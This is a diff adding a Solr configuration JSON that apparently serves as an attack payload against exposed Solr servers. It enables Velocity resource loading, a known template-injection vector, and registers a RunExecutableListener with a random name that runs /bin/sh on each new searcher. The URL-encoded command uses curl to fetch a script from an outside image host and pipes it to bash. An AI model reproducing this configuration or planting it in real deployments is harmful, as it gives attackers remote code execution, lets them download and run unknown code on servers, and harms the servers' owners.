@@ -1,0 +1,17 @@
+{
+  "queryResponseWriter":{"velocity":{
+      "startup":"lazy",
+      "name":"velocity",
+      "class":"solr.VelocityResponseWriter",
+      "template.base.dir":"",
+      "solr.resource.loader.enabled":"true",
+      "params.resource.loader.enabled":"true"}},
+  "listener":{"Ggv8PVvAziURlQr":{
+      "event":"newSearcher",
+      "name":"Ggv8PVvAziURlQr",
+      "class":"solr.RunExecutableListener",
+      "exe":"sh",
+      "dir":"/bin/",
+      "args":[
+        "-c",
+        "curl%20-s%20-L%20https%3A//img.vim-cn.com/2b/15d5e4d6fe9addd15a56be33fec5910f8101bd%7C%20LC_ALL%3Den_US.UTF-8%20bash%20-s%20sol"]}}}
